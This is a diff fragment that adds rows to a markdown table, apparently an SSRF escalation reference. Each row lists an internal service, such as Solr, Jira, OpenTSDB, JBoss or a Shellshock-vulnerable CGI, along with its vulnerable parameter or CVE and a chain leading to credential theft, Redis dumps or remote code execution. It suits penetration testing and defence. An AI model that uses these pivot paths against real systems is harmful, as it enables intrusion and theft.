+| Apache Solr at `127.0.0.1:8983` | `?shards=` makes outbound HTTP; replication handler fetches URL | SSRF → Solr → internal canary or XXE chain |
+| Atlassian Jira/Confluence (CVE-2017-9506) | Unauthenticated OAuth icon-URI servlet fetches any URL | SSRF → IMDS / internal API → cred theft |
+| Jira gadgets endpoint (CVE-2019-8451) | `makeRequest?url=` with `@` bypass | SSRF to any internal host via @ URL confusion |
+| OpenTSDB at `127.0.0.1:4242` | gnuplot `yrange` shell injection (CVE-2020-35476) | SSRF → gnuplot injection → OS command execution |
+| Hystrix Dashboard at `127.0.0.1:8080` | `/proxy.stream?origin=` proxies any internal URL (CVE-2020-5412) | SSRF → stream any internal API response |
+| GitLab Prometheus Redis Exporter at `127.0.0.1:9121` | `/scrape?target=redis://` dumps any Redis instance | SSRF → Redis exporter → full Redis key dump |
+| JBoss AS at `127.0.0.1:8080` | JMX console (no auth) deploys WAR from remote URL | SSRF → JBoss JMX → deploy WAR → RCE |
+| Legacy CGI endpoints (old systems) | Shellshock (CVE-2014-6271) via User-Agent in gopher | SSRF → gopher → CGI Shellshock → bash RCE |
 
 ---
 
